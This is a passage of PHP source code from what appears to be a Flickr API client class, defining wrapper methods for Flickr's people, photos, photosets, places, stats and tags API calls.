    function machinetags_getPairs($namespace = NULL, $predicate = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.machinetags.getPairs", array(
            "namespace" => $namespace,
            "predicate" => $predicate,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function machinetags_getPredicates($namespace = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.machinetags.getPredicates", array(
            "namespace" => $namespace,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function machinetags_getRecentValues($namespace = NULL, $predicate = NULL, $added_since = NULL)
    {
        return $this->call("flickr.machinetags.getRecentValues", array(
            "namespace" => $namespace,
            "predicate" => $predicate,
            "added_since" => $added_since
        ));
    }
    function machinetags_getValues($namespace, $predicate, $per_page = NULL, $page = NULL, $usage = NULL)
    {
        return $this->call("flickr.machinetags.getValues", array(
            "namespace" => $namespace,
            "predicate" => $predicate,
            "per_page" => $per_page,
            "page" => $page,
            "usage" => $usage
        ));
    }
    function panda_getList()
    {
        return $this->call("flickr.panda.getList", array());
    }
    function panda_getPhotos($panda_name, $extras = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.panda.getPhotos", array(
            "panda_name" => $panda_name,
            "extras" => $extras,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function people_findByEmail($find_email)
    {
        $this->request("flickr.people.findByEmail", array(
            "find_email" => $find_email
        ));
        return $this->parsed_response ? $this->parsed_response["user"] : false;
    }
    function people_findByUsername($username)
    {
        $this->request("flickr.people.findByUsername", array(
            "username" => $username
        ));
        return $this->parsed_response ? $this->parsed_response["user"] : false;
    }
    function people_getInfo($user_id)
    {
        $this->request("flickr.people.getInfo", array(
            "user_id" => $user_id
        ));
        return $this->parsed_response ? $this->parsed_response["person"] : false;
    }
    function people_getPhotos($user_id, $args = array())
    {
        return $this->call("flickr.people.getPhotos", array_merge(array(
            "user_id" => $user_id
        ), $args));
    }
    function people_getPhotosOf($user_id, $extras = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.people.getPhotosOf", array(
            "user_id" => $user_id,
            "extras" => $extras,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function people_getPublicGroups($user_id)
    {
        $this->request("flickr.people.getPublicGroups", array(
            "user_id" => $user_id
        ));
        return $this->parsed_response ? $this->parsed_response["groups"]["group"] : false;
    }
    function people_getPublicPhotos($user_id, $safe_search = NULL, $extras = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.people.getPublicPhotos", array(
            "user_id" => $user_id,
            "safe_search" => $safe_search,
            "extras" => $extras,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function people_getUploadStatus()
    {
        $this->request("flickr.people.getUploadStatus");
        return $this->parsed_response ? $this->parsed_response["user"] : false;
    }
    function photos_addTags($photo_id, $tags)
    {
        $this->request("flickr.photos.addTags", array(
            "photo_id" => $photo_id,
            "tags" => $tags
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photos_delete($photo_id)
    {
        $this->request("flickr.photos.delete", array(
            "photo_id" => $photo_id
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photos_getAllContexts($photo_id)
    {
        $this->request("flickr.photos.getAllContexts", array(
            "photo_id" => $photo_id
        ));
        return $this->parsed_response ? $this->parsed_response : false;
    }
    function photos_getContactsPhotos($count = NULL, $just_friends = NULL, $single_photo = NULL, $include_self = NULL, $extras = NULL)
    {
        $this->request("flickr.photos.getContactsPhotos", array(
            "count" => $count,
            "just_friends" => $just_friends,
            "single_photo" => $single_photo,
            "include_self" => $include_self,
            "extras" => $extras
        ));
        return $this->parsed_response ? $this->parsed_response["photos"]["photo"] : false;
    }
    function photos_getContactsPublicPhotos($user_id, $count = NULL, $just_friends = NULL, $single_photo = NULL, $include_self = NULL, $extras = NULL)
    {
        $this->request("flickr.photos.getContactsPublicPhotos", array(
            "user_id" => $user_id,
            "count" => $count,
            "just_friends" => $just_friends,
            "single_photo" => $single_photo,
            "include_self" => $include_self,
            "extras" => $extras
        ));
        return $this->parsed_response ? $this->parsed_response["photos"]["photo"] : false;
    }
    function photos_getContext($photo_id, $num_prev = NULL, $num_next = NULL, $extras = NULL, $order_by = NULL)
    {
        return $this->call("flickr.photos.getContext", array(
            "photo_id" => $photo_id,
            "num_prev" => $num_prev,
            "num_next" => $num_next,
            "extras" => $extras,
            "order_by" => $order_by
        ));
    }
    function photos_getCounts($dates = NULL, $taken_dates = NULL)
    {
        $this->request("flickr.photos.getCounts", array(
            "dates" => $dates,
            "taken_dates" => $taken_dates
        ));
        return $this->parsed_response ? $this->parsed_response["photocounts"]["photocount"] : false;
    }
    function photos_getExif($photo_id, $secret = NULL)
    {
        $this->request("flickr.photos.getExif", array(
            "photo_id" => $photo_id,
            "secret" => $secret
        ));
        return $this->parsed_response ? $this->parsed_response["photo"] : false;
    }
    function photos_getFavorites($photo_id, $page = NULL, $per_page = NULL)
    {
        $this->request("flickr.photos.getFavorites", array(
            "photo_id" => $photo_id,
            "page" => $page,
            "per_page" => $per_page
        ));
        return $this->parsed_response ? $this->parsed_response["photo"] : false;
    }
    function photos_getInfo($photo_id, $secret = NULL)
    {
        return $this->call("flickr.photos.getInfo", array(
            "photo_id" => $photo_id,
            "secret" => $secret
        ));
    }
    function photos_getNotInSet($max_upload_date = NULL, $min_taken_date = NULL, $max_taken_date = NULL, $privacy_filter = NULL, $media = NULL, $min_upload_date = NULL, $extras = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.photos.getNotInSet", array(
            "max_upload_date" => $max_upload_date,
            "min_taken_date" => $min_taken_date,
            "max_taken_date" => $max_taken_date,
            "privacy_filter" => $privacy_filter,
            "media" => $media,
            "min_upload_date" => $min_upload_date,
            "extras" => $extras,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function photos_getPerms($photo_id)
    {
        $this->request("flickr.photos.getPerms", array(
            "photo_id" => $photo_id
        ));
        return $this->parsed_response ? $this->parsed_response["perms"] : false;
    }
    function photos_getRecent($jump_to = NULL, $extras = NULL, $per_page = NULL, $page = NULL)
    {
        if (is_array($extras)) {
            $extras = implode(",", $extras);
        }
        return $this->call("flickr.photos.getRecent", array(
            "jump_to" => $jump_to,
            "extras" => $extras,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function photos_getSizes($photo_id)
    {
        $this->request("flickr.photos.getSizes", array(
            "photo_id" => $photo_id
        ));
        return $this->parsed_response ? $this->parsed_response["sizes"]["size"] : false;
    }
    function photos_getUntagged($min_upload_date = NULL, $max_upload_date = NULL, $min_taken_date = NULL, $max_taken_date = NULL, $privacy_filter = NULL, $media = NULL, $extras = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.photos.getUntagged", array(
            "min_upload_date" => $min_upload_date,
            "max_upload_date" => $max_upload_date,
            "min_taken_date" => $min_taken_date,
            "max_taken_date" => $max_taken_date,
            "privacy_filter" => $privacy_filter,
            "media" => $media,
            "extras" => $extras,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function photos_getWithGeoData($args = array())
    {
        $this->request("flickr.photos.getWithGeoData", $args);
        return $this->parsed_response ? $this->parsed_response["photos"] : false;
    }
    function photos_getWithoutGeoData($args = array())
    {
        $this->request("flickr.photos.getWithoutGeoData", $args);
        return $this->parsed_response ? $this->parsed_response["photos"] : false;
    }
    function photos_recentlyUpdated($min_date, $extras = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.photos.recentlyUpdated", array(
            "min_date" => $min_date,
            "extras" => $extras,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function photos_removeTag($tag_id)
    {
        $this->request("flickr.photos.removeTag", array(
            "tag_id" => $tag_id
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photos_search($args = array())
    {
        $this->request("flickr.photos.search", $args);
        return $this->parsed_response ? $this->parsed_response["photos"] : false;
    }
    function photos_setContentType($photo_id, $content_type)
    {
        return $this->call("flickr.photos.setContentType", array(
            "photo_id" => $photo_id,
            "content_type" => $content_type
        ));
    }
    function photos_setDates($photo_id, $date_posted = NULL, $date_taken = NULL, $date_taken_granularity = NULL)
    {
        $this->request("flickr.photos.setDates", array(
            "photo_id" => $photo_id,
            "date_posted" => $date_posted,
            "date_taken" => $date_taken,
            "date_taken_granularity" => $date_taken_granularity
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photos_setMeta($photo_id, $title, $description)
    {
        $this->request("flickr.photos.setMeta", array(
            "photo_id" => $photo_id,
            "title" => $title,
            "description" => $description
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photos_setPerms($photo_id, $is_public, $is_friend, $is_family, $perm_comment, $perm_addmeta)
    {
        $this->request("flickr.photos.setPerms", array(
            "photo_id" => $photo_id,
            "is_public" => $is_public,
            "is_friend" => $is_friend,
            "is_family" => $is_family,
            "perm_comment" => $perm_comment,
            "perm_addmeta" => $perm_addmeta
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photos_setSafetyLevel($photo_id, $safety_level = NULL, $hidden = NULL)
    {
        return $this->call("flickr.photos.setSafetyLevel", array(
            "photo_id" => $photo_id,
            "safety_level" => $safety_level,
            "hidden" => $hidden
        ));
    }
    function photos_setTags($photo_id, $tags)
    {
        $this->request("flickr.photos.setTags", array(
            "photo_id" => $photo_id,
            "tags" => $tags
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photos_comments_addComment($photo_id, $comment_text)
    {
        $this->request("flickr.photos.comments.addComment", array(
            "photo_id" => $photo_id,
            "comment_text" => $comment_text
        ), TRUE);
        return $this->parsed_response ? $this->parsed_response["comment"] : false;
    }
    function photos_comments_deleteComment($comment_id)
    {
        $this->request("flickr.photos.comments.deleteComment", array(
            "comment_id" => $comment_id
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photos_comments_editComment($comment_id, $comment_text)
    {
        $this->request("flickr.photos.comments.editComment", array(
            "comment_id" => $comment_id,
            "comment_text" => $comment_text
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photos_comments_getList($photo_id, $min_comment_date = NULL, $max_comment_date = NULL, $page = NULL, $per_page = NULL, $include_faves = NULL)
    {
        return $this->call("flickr.photos.comments.getList", array(
            "photo_id" => $photo_id,
            "min_comment_date" => $min_comment_date,
            "max_comment_date" => $max_comment_date,
            "page" => $page,
            "per_page" => $per_page,
            "include_faves" => $include_faves
        ));
    }
    function photos_comments_getRecentForContacts($date_lastcomment = NULL, $contacts_filter = NULL, $extras = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.photos.comments.getRecentForContacts", array(
            "date_lastcomment" => $date_lastcomment,
            "contacts_filter" => $contacts_filter,
            "extras" => $extras,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function photos_geo_batchCorrectLocation($lat, $lon, $accuracy, $place_id = NULL, $woe_id = NULL)
    {
        return $this->call("flickr.photos.geo.batchCorrectLocation", array(
            "lat" => $lat,
            "lon" => $lon,
            "accuracy" => $accuracy,
            "place_id" => $place_id,
            "woe_id" => $woe_id
        ));
    }
    function photos_geo_correctLocation($photo_id, $place_id = NULL, $woe_id = NULL)
    {
        return $this->call("flickr.photos.geo.correctLocation", array(
            "photo_id" => $photo_id,
            "place_id" => $place_id,
            "woe_id" => $woe_id
        ));
    }
    function photos_geo_getLocation($photo_id)
    {
        $this->request("flickr.photos.geo.getLocation", array(
            "photo_id" => $photo_id
        ));
        return $this->parsed_response ? $this->parsed_response["photo"] : false;
    }
    function photos_geo_getPerms($photo_id)
    {
        $this->request("flickr.photos.geo.getPerms", array(
            "photo_id" => $photo_id
        ));
        return $this->parsed_response ? $this->parsed_response["perms"] : false;
    }
    function photos_geo_photosForLocation($lat, $lon, $accuracy = NULL, $extras = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.photos.geo.photosForLocation", array(
            "lat" => $lat,
            "lon" => $lon,
            "accuracy" => $accuracy,
            "extras" => $extras,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function photos_geo_removeLocation($photo_id)
    {
        $this->request("flickr.photos.geo.removeLocation", array(
            "photo_id" => $photo_id
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photos_geo_setContext($photo_id, $context)
    {
        return $this->call("flickr.photos.geo.setContext", array(
            "photo_id" => $photo_id,
            "context" => $context
        ));
    }
    function photos_geo_setLocation($photo_id, $lat, $lon, $accuracy = NULL, $context = NULL, $bookmark_id = NULL)
    {
        return $this->call("flickr.photos.geo.setLocation", array(
            "photo_id" => $photo_id,
            "lat" => $lat,
            "lon" => $lon,
            "accuracy" => $accuracy,
            "context" => $context,
            "bookmark_id" => $bookmark_id
        ));
    }
    function photos_geo_setPerms($is_public, $is_contact, $is_friend, $is_family, $photo_id)
    {
        return $this->call("flickr.photos.geo.setPerms", array(
            "is_public" => $is_public,
            "is_contact" => $is_contact,
            "is_friend" => $is_friend,
            "is_family" => $is_family,
            "photo_id" => $photo_id
        ));
    }
    function photos_licenses_getInfo()
    {
        $this->request("flickr.photos.licenses.getInfo");
        return $this->parsed_response ? $this->parsed_response["licenses"]["license"] : false;
    }
    function photos_licenses_setLicense($photo_id, $license_id)
    {
        $this->request("flickr.photos.licenses.setLicense", array(
            "photo_id" => $photo_id,
            "license_id" => $license_id
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photos_notes_add($photo_id, $note_x, $note_y, $note_w, $note_h, $note_text)
    {
        $this->request("flickr.photos.notes.add", array(
            "photo_id" => $photo_id,
            "note_x" => $note_x,
            "note_y" => $note_y,
            "note_w" => $note_w,
            "note_h" => $note_h,
            "note_text" => $note_text
        ), TRUE);
        return $this->parsed_response ? $this->parsed_response["note"] : false;
    }
    function photos_notes_delete($note_id)
    {
        $this->request("flickr.photos.notes.delete", array(
            "note_id" => $note_id
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photos_notes_edit($note_id, $note_x, $note_y, $note_w, $note_h, $note_text)
    {
        $this->request("flickr.photos.notes.edit", array(
            "note_id" => $note_id,
            "note_x" => $note_x,
            "note_y" => $note_y,
            "note_w" => $note_w,
            "note_h" => $note_h,
            "note_text" => $note_text
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photos_transform_rotate($photo_id, $degrees)
    {
        $this->request("flickr.photos.transform.rotate", array(
            "photo_id" => $photo_id,
            "degrees" => $degrees
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photos_people_add($photo_id, $user_id, $person_x = NULL, $person_y = NULL, $person_w = NULL, $person_h = NULL)
    {
        return $this->call("flickr.photos.people.add", array(
            "photo_id" => $photo_id,
            "user_id" => $user_id,
            "person_x" => $person_x,
            "person_y" => $person_y,
            "person_w" => $person_w,
            "person_h" => $person_h
        ));
    }
    function photos_people_delete($photo_id, $user_id, $email = NULL)
    {
        return $this->call("flickr.photos.people.delete", array(
            "photo_id" => $photo_id,
            "user_id" => $user_id,
            "email" => $email
        ));
    }
    function photos_people_deleteCoords($photo_id, $user_id)
    {
        return $this->call("flickr.photos.people.deleteCoords", array(
            "photo_id" => $photo_id,
            "user_id" => $user_id
        ));
    }
    function photos_people_editCoords($photo_id, $user_id, $person_x, $person_y, $person_w, $person_h, $email = NULL)
    {
        return $this->call("flickr.photos.people.editCoords", array(
            "photo_id" => $photo_id,
            "user_id" => $user_id,
            "person_x" => $person_x,
            "person_y" => $person_y,
            "person_w" => $person_w,
            "person_h" => $person_h,
            "email" => $email
        ));
    }
    function photos_people_getList($photo_id)
    {
        return $this->call("flickr.photos.people.getList", array(
            "photo_id" => $photo_id
        ));
    }
    function photos_upload_checkTickets($tickets)
    {
        if (is_array($tickets)) {
            $tickets = implode(",", $tickets);
        }
        $this->request("flickr.photos.upload.checkTickets", array(
            "tickets" => $tickets
        ), TRUE);
        return $this->parsed_response ? $this->parsed_response["uploader"]["ticket"] : false;
    }
    function photosets_addPhoto($photoset_id, $photo_id)
    {
        $this->request("flickr.photosets.addPhoto", array(
            "photoset_id" => $photoset_id,
            "photo_id" => $photo_id
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photosets_create($title, $description, $primary_photo_id)
    {
        $this->request("flickr.photosets.create", array(
            "title" => $title,
            "primary_photo_id" => $primary_photo_id,
            "description" => $description
        ), TRUE);
        return $this->parsed_response ? $this->parsed_response["photoset"] : false;
    }
    function photosets_delete($photoset_id)
    {
        $this->request("flickr.photosets.delete", array(
            "photoset_id" => $photoset_id
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photosets_editMeta($photoset_id, $title, $description = NULL)
    {
        $this->request("flickr.photosets.editMeta", array(
            "photoset_id" => $photoset_id,
            "title" => $title,
            "description" => $description
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photosets_editPhotos($photoset_id, $primary_photo_id, $photo_ids)
    {
        $this->request("flickr.photosets.editPhotos", array(
            "photoset_id" => $photoset_id,
            "primary_photo_id" => $primary_photo_id,
            "photo_ids" => $photo_ids
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photosets_getContext($photo_id, $photoset_id, $num_prev = NULL, $num_next = NULL)
    {
        return $this->call("flickr.photosets.getContext", array(
            "photo_id" => $photo_id,
            "photoset_id" => $photoset_id,
            "num_prev" => $num_prev,
            "num_next" => $num_next
        ));
    }
    function photosets_getInfo($photoset_id)
    {
        $this->request("flickr.photosets.getInfo", array(
            "photoset_id" => $photoset_id
        ));
        return $this->parsed_response ? $this->parsed_response["photoset"] : false;
    }
    function photosets_getList($user_id = NULL)
    {
        $this->request("flickr.photosets.getList", array(
            "user_id" => $user_id
        ));
        return $this->parsed_response ? $this->parsed_response["photosets"] : false;
    }
    function photosets_getPhotos($photoset_id, $extras = NULL, $privacy_filter = NULL, $per_page = NULL, $page = NULL, $media = NULL)
    {
        return $this->call("flickr.photosets.getPhotos", array(
            "photoset_id" => $photoset_id,
            "extras" => $extras,
            "privacy_filter" => $privacy_filter,
            "per_page" => $per_page,
            "page" => $page,
            "media" => $media
        ));
    }
    function photosets_orderSets($photoset_ids)
    {
        if (is_array($photoset_ids)) {
            $photoset_ids  = implode(",", $photoset_ids);
        }
        $this->request("flickr.photosets.orderSets", array(
            "photoset_ids" => $photoset_ids
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photosets_removePhoto($photoset_id, $photo_id)
    {
        $this->request("flickr.photosets.removePhoto", array(
            "photoset_id" => $photoset_id,
            "photo_id" => $photo_id
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photosets_removePhotos($photoset_id, $photo_ids)
    {
        return $this->call("flickr.photosets.removePhotos", array(
            "photoset_id" => $photoset_id,
            "photo_ids" => $photo_ids
        ));
    }
    function photosets_reorderPhotos($photoset_id, $photo_ids)
    {
        return $this->call("flickr.photosets.reorderPhotos", array(
            "photoset_id" => $photoset_id,
            "photo_ids" => $photo_ids
        ));
    }
    function photosets_setPrimaryPhoto($photoset_id, $photo_id)
    {
        return $this->call("flickr.photosets.setPrimaryPhoto", array(
            "photoset_id" => $photoset_id,
            "photo_id" => $photo_id
        ));
    }
    function photosets_comments_addComment($photoset_id, $comment_text)
    {
        $this->request("flickr.photosets.comments.addComment", array(
            "photoset_id" => $photoset_id,
            "comment_text" => $comment_text
        ), TRUE);
        return $this->parsed_response ? $this->parsed_response["comment"] : false;
    }
    function photosets_comments_deleteComment($comment_id)
    {
        $this->request("flickr.photosets.comments.deleteComment", array(
            "comment_id" => $comment_id
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photosets_comments_editComment($comment_id, $comment_text)
    {
        $this->request("flickr.photosets.comments.editComment", array(
            "comment_id" => $comment_id,
            "comment_text" => $comment_text
        ), TRUE);
        return $this->parsed_response ? true : false;
    }
    function photosets_comments_getList($photoset_id)
    {
        $this->request("flickr.photosets.comments.getList", array(
            "photoset_id" => $photoset_id
        ));
        return $this->parsed_response ? $this->parsed_response["comments"] : false;
    }
    function places_find($query)
    {
        return $this->call("flickr.places.find", array(
            "query" => $query
        ));
    }
    function places_findByLatLon($lat, $lon, $accuracy = NULL)
    {
        return $this->call("flickr.places.findByLatLon", array(
            "lat" => $lat,
            "lon" => $lon,
            "accuracy" => $accuracy
        ));
    }
    function places_getChildrenWithPhotosPublic($place_id = NULL, $woe_id = NULL)
    {
        return $this->call("flickr.places.getChildrenWithPhotosPublic", array(
            "place_id" => $place_id,
            "woe_id" => $woe_id
        ));
    }
    function places_getInfo($place_id = NULL, $woe_id = NULL)
    {
        return $this->call("flickr.places.getInfo", array(
            "place_id" => $place_id,
            "woe_id" => $woe_id
        ));
    }
    function places_getInfoByUrl($url)
    {
        return $this->call("flickr.places.getInfoByUrl", array(
            "url" => $url
        ));
    }
    function places_getPlaceTypes()
    {
        return $this->call("flickr.places.getPlaceTypes", array());
    }
    function places_getShapeHistory($place_id = NULL, $woe_id = NULL)
    {
        return $this->call("flickr.places.getShapeHistory", array(
            "place_id" => $place_id,
            "woe_id" => $woe_id
        ));
    }
    function places_getTopPlacesList($place_type_id, $date = NULL, $woe_id = NULL, $place_id = NULL)
    {
        return $this->call("flickr.places.getTopPlacesList", array(
            "place_type_id" => $place_type_id,
            "date" => $date,
            "woe_id" => $woe_id,
            "place_id" => $place_id
        ));
    }
    function places_placesForBoundingBox($bbox, $place_type = NULL, $place_type_id = NULL, $recursive = NULL)
    {
        return $this->call("flickr.places.placesForBoundingBox", array(
            "bbox" => $bbox,
            "place_type" => $place_type,
            "place_type_id" => $place_type_id,
            "recursive" => $recursive
        ));
    }
    function places_placesForContacts($place_type = NULL, $place_type_id = NULL, $woe_id = NULL, $place_id = NULL, $threshold = NULL, $contacts = NULL, $min_upload_date = NULL, $max_upload_date = NULL, $min_taken_date = NULL, $max_taken_date = NULL)
    {
        return $this->call("flickr.places.placesForContacts", array(
            "place_type" => $place_type,
            "place_type_id" => $place_type_id,
            "woe_id" => $woe_id,
            "place_id" => $place_id,
            "threshold" => $threshold,
            "contacts" => $contacts,
            "min_upload_date" => $min_upload_date,
            "max_upload_date" => $max_upload_date,
            "min_taken_date" => $min_taken_date,
            "max_taken_date" => $max_taken_date
        ));
    }
    function places_placesForTags($place_type_id, $woe_id = NULL, $place_id = NULL, $threshold = NULL, $tags = NULL, $tag_mode = NULL, $machine_tags = NULL, $machine_tag_mode = NULL, $min_upload_date = NULL, $max_upload_date = NULL, $min_taken_date = NULL, $max_taken_date = NULL)
    {
        return $this->call("flickr.places.placesForTags", array(
            "place_type_id" => $place_type_id,
            "woe_id" => $woe_id,
            "place_id" => $place_id,
            "threshold" => $threshold,
            "tags" => $tags,
            "tag_mode" => $tag_mode,
            "machine_tags" => $machine_tags,
            "machine_tag_mode" => $machine_tag_mode,
            "min_upload_date" => $min_upload_date,
            "max_upload_date" => $max_upload_date,
            "min_taken_date" => $min_taken_date,
            "max_taken_date" => $max_taken_date
        ));
    }
    function places_placesForUser($place_type_id = NULL, $place_type = NULL, $woe_id = NULL, $place_id = NULL, $threshold = NULL, $min_upload_date = NULL, $max_upload_date = NULL, $min_taken_date = NULL, $max_taken_date = NULL)
    {
        return $this->call("flickr.places.placesForUser", array(
            "place_type_id" => $place_type_id,
            "place_type" => $place_type,
            "woe_id" => $woe_id,
            "place_id" => $place_id,
            "threshold" => $threshold,
            "min_upload_date" => $min_upload_date,
            "max_upload_date" => $max_upload_date,
            "min_taken_date" => $min_taken_date,
            "max_taken_date" => $max_taken_date
        ));
    }
    function places_resolvePlaceId($place_id)
    {
        $rsp = $this->call("flickr.places.resolvePlaceId", array(
            "place_id" => $place_id
        ));
        return $rsp ? $rsp["location"] : $rsp;
    }
    function places_resolvePlaceURL($url)
    {
        $rsp = $this->call("flickr.places.resolvePlaceURL", array(
            "url" => $url
        ));
        return $rsp ? $rsp["location"] : $rsp;
    }
    function places_tagsForPlace($woe_id = NULL, $place_id = NULL, $min_upload_date = NULL, $max_upload_date = NULL, $min_taken_date = NULL, $max_taken_date = NULL)
    {
        return $this->call("flickr.places.tagsForPlace", array(
            "woe_id" => $woe_id,
            "place_id" => $place_id,
            "min_upload_date" => $min_upload_date,
            "max_upload_date" => $max_upload_date,
            "min_taken_date" => $min_taken_date,
            "max_taken_date" => $max_taken_date
        ));
    }
    function prefs_getContentType()
    {
        $rsp = $this->call("flickr.prefs.getContentType", array());
        return $rsp ? $rsp["person"] : $rsp;
    }
    function prefs_getGeoPerms()
    {
        return $this->call("flickr.prefs.getGeoPerms", array());
    }
    function prefs_getHidden()
    {
        $rsp = $this->call("flickr.prefs.getHidden", array());
        return $rsp ? $rsp["person"] : $rsp;
    }
    function prefs_getPrivacy()
    {
        $rsp = $this->call("flickr.prefs.getPrivacy", array());
        return $rsp ? $rsp["person"] : $rsp;
    }
    function prefs_getSafetyLevel()
    {
        $rsp = $this->call("flickr.prefs.getSafetyLevel", array());
        return $rsp ? $rsp["person"] : $rsp;
    }
    function reflection_getMethodInfo($method_name)
    {
        $this->request("flickr.reflection.getMethodInfo", array(
            "method_name" => $method_name
        ));
        return $this->parsed_response ? $this->parsed_response : false;
    }
    function reflection_getMethods()
    {
        $this->request("flickr.reflection.getMethods");
        return $this->parsed_response ? $this->parsed_response["methods"]["method"] : false;
    }
    function stats_getCollectionDomains($date, $collection_id = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.stats.getCollectionDomains", array(
            "date" => $date,
            "collection_id" => $collection_id,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function stats_getCollectionReferrers($date, $domain, $collection_id = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.stats.getCollectionReferrers", array(
            "date" => $date,
            "domain" => $domain,
            "collection_id" => $collection_id,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function stats_getCollectionStats($date, $collection_id)
    {
        return $this->call("flickr.stats.getCollectionStats", array(
            "date" => $date,
            "collection_id" => $collection_id
        ));
    }
    function stats_getCSVFiles()
    {
        return $this->call("flickr.stats.getCSVFiles", array());
    }
    function stats_getPhotoDomains($date, $photo_id = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.stats.getPhotoDomains", array(
            "date" => $date,
            "photo_id" => $photo_id,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function stats_getPhotoReferrers($date, $domain, $photo_id = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.stats.getPhotoReferrers", array(
            "date" => $date,
            "domain" => $domain,
            "photo_id" => $photo_id,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function stats_getPhotosetDomains($date, $photoset_id = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.stats.getPhotosetDomains", array(
            "date" => $date,
            "photoset_id" => $photoset_id,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function stats_getPhotosetReferrers($date, $domain, $photoset_id = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.stats.getPhotosetReferrers", array(
            "date" => $date,
            "domain" => $domain,
            "photoset_id" => $photoset_id,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function stats_getPhotosetStats($date, $photoset_id)
    {
        return $this->call("flickr.stats.getPhotosetStats", array(
            "date" => $date,
            "photoset_id" => $photoset_id
        ));
    }
    function stats_getPhotoStats($date, $photo_id)
    {
        return $this->call("flickr.stats.getPhotoStats", array(
            "date" => $date,
            "photo_id" => $photo_id
        ));
    }
    function stats_getPhotostreamDomains($date, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.stats.getPhotostreamDomains", array(
            "date" => $date,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function stats_getPhotostreamReferrers($date, $domain, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.stats.getPhotostreamReferrers", array(
            "date" => $date,
            "domain" => $domain,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function stats_getPhotostreamStats($date)
    {
        return $this->call("flickr.stats.getPhotostreamStats", array(
            "date" => $date
        ));
    }
    function stats_getPopularPhotos($date = NULL, $sort = NULL, $per_page = NULL, $page = NULL)
    {
        return $this->call("flickr.stats.getPopularPhotos", array(
            "date" => $date,
            "sort" => $sort,
            "per_page" => $per_page,
            "page" => $page
        ));
    }
    function stats_getTotalViews($date = NULL)
    {
        return $this->call("flickr.stats.getTotalViews", array(
            "date" => $date
        ));
    }
    function tags_getClusterPhotos($tag, $cluster_id)
    {
        return $this->call("flickr.tags.getClusterPhotos", array(
            "tag" => $tag,
            "cluster_id" => $cluster_id
        ));
    }
    function tags_getClusters($tag)
    {
        return $this->call("flickr.tags.getClusters", array(
            "tag" => $tag
        ));
    }
    function tags_getHotList($period = NULL, $count = NULL)
    {
        $this->request("flickr.tags.getHotList", array(
            "period" => $period,
            "count" => $count
        ));
        return $this->parsed_response ? $this->parsed_response["hottags"] : false;
    }
    function tags_getListPhoto($photo_id)
    {
        $this->request("flickr.tags.getListPhoto", array(
            "photo_id" => $photo_id
        ));
        return $this->parsed_response ? $this->parsed_response["photo"]["tags"]["tag"] : false;
    }
    function tags_getListUser($user_id = NULL)
    {
        $this->request("flickr.tags.getListUser", array(
            "user_id" => $user_id
        ));
        return $this->parsed_response ? $this->parsed_response["who"]["tags"]["tag"] : false;
    }
    function tags_getListUserPopular($user_id = NULL, $count = NULL)
    {
        $this->request("flickr.tags.getListUserPopular", array(
            "user_id" => $user_id,
            "count" => $count
        ));
        return $this->parsed_response ? $this->parsed_response["who"]["tags"]["tag"] : false;
    }
    function tags_getListUserRaw($tag = NULL)
    {
        return $this->call("flickr.tags.getListUserRaw", array(
            "tag" => $tag
        ));
    }
    function tags_getRelated($tag)
    {
        $this->request("flickr.tags.getRelated", array(
            "tag" => $tag
        ));
        return $this->parsed_response ? $this->parsed_response["tags"] : false;
    }
    function test_echo($args = array())
    {
        $this->request("flickr.test.echo", $args);
